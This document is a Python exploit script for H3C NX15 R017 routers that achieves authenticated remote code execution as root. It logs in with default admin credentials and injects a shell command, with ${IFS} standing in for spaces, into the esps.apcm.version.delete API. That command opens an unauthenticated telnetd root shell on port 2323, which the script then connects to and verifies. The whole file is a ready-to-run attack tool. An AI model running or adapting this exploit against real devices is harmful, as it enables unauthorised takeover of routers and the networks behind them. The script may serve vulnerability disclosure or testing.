#!/usr/bin/env python3
import argparse
import json
import socket
import sys
import time

import requests


def log(msg: str):
    print(msg, flush=True)


def login(base: str, username: str, password: str) -> str:
    r = requests.post(
        base.rstrip('/') + '/api/login/auth',
        json={'username': username, 'password': password},
        timeout=10,
    )
    r.raise_for_status()
    j = r.json()
    if j.get('code') != 0:
        raise RuntimeError(f'login failed: {j}')
    return j['data']['session']


def esps(base: str, session: str, obj: str, method: str, param: dict, timeout: int = 30):
    headers = {'AUTHENTICATION': session, 'Content-Type': 'application/json'}
    payload = [{'id': 1, 'object': obj, 'method': method, 'param': param}]
    r = requests.post(base.rstrip('/') + '/api/esps', headers=headers, data=json.dumps(payload), timeout=timeout)
    r.raise_for_status()
    try:
        return r.json()
    except Exception:
        return r.text


def connect_shell(host: str, port: int, timeout: float = 5.0):
    s = socket.socket()
    s.settimeout(timeout)
    s.connect((host, port))
    time.sleep(0.3)
    banner = b''
    try:
        banner += s.recv(4096)
    except Exception:
        pass
    return s, banner


def run_shell_cmd(sock: socket.socket, cmd: str, end_marker: str = '__END__') -> str:
    sock.sendall(f'{cmd}; echo {end_marker}\n'.encode())
    time.sleep(0.6)
    data = b''
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if end_marker.encode() in data or len(data) > 65535:
                break
    except Exception:
        pass
    return data.decode('latin1', 'ignore')


def main():
    ap = argparse.ArgumentParser(description='H3C NX15 R017 post-auth RCE via esps.apcm.version.delete eval injection')
    ap.add_argument('--base', default='http://192.168.8.1', help='router base URL')
    ap.add_argument('--username', default='admin', help='web admin username')
    ap.add_argument('--password', default='admin123', help='web admin password')
    ap.add_argument('--host', default='192.168.8.1', help='target host for shell connection')
    ap.add_argument('--port', type=int, default=2323, help='temporary telnetd shell port')
    ap.add_argument('--delay', type=float, default=2.0, help='seconds to wait after trigger')
    ap.add_argument('--cleanup', action='store_true', help='kill spawned shell after verification')
    args = ap.parse_args()

    marker = 'APCMVER_RCE_OK'
    payload = f'$(echo{chr(36)}{{IFS}}{marker}>/tmp/apcmver_rce_marker&&/usr/sbin/telnetd{chr(36)}{{IFS}}-p{chr(36)}{{IFS}}{args.port}{chr(36)}{{IFS}}-l{chr(36)}{{IFS}}/bin/sh)'

    log('[*] Step 1: login')
    session = login(args.base, args.username, args.password)
    log(f'[*] session = {session}')

    log('[*] Step 2: trigger esps.apcm.version.delete RCE via list item')
    req = {'list': [payload]}
    resp = esps(args.base, session, 'esps.apcm.version', 'delete', req)
    print(json.dumps(resp, ensure_ascii=False, indent=2) if not isinstance(resp, str) else resp)

    log(f'[*] Step 3: wait {args.delay:.1f}s for shell on {args.host}:{args.port}')
    time.sleep(args.delay)

    log('[*] Step 4: connect shell and verify root code execution')
    sock, banner = connect_shell(args.host, args.port)
    print(banner.decode('latin1', 'ignore'))
    proof = run_shell_cmd(sock, 'id; uname -a; cat /tmp/apcmver_rce_marker 2>/dev/null')
    print(proof)
    ok = ('uid=0(root)' in proof) and (marker in proof)

    log('[*] Step 5: read back AP version list')
    get_resp = esps(args.base, session, 'esps.apcm.version', 'getlist', {})
    print(json.dumps(get_resp, ensure_ascii=False, indent=2) if not isinstance(get_resp, str) else get_resp)

    if args.cleanup:
        log('[*] Step 6: cleanup temporary shell')
        awk_pat = rf'/\/usr\/sbin\/telnetd -p {args.port} -l \/bin\/sh/ && !/awk/ {{print $1}}'
        cleanup_out = run_shell_cmd(sock, f'pid=$(ps w | awk \'{awk_pat}\'); [ -n "$pid" ] && kill $pid; echo cleaned')
        print(cleanup_out)

    sock.close()

    if ok:
        log('[+] SUCCESS: root RCE via esps.apcm.version.delete injection')
        return 0

    log('[-] FAILED: expected proof not found')
    return 1


if __name__ == '__main__':
    sys.exit(main())
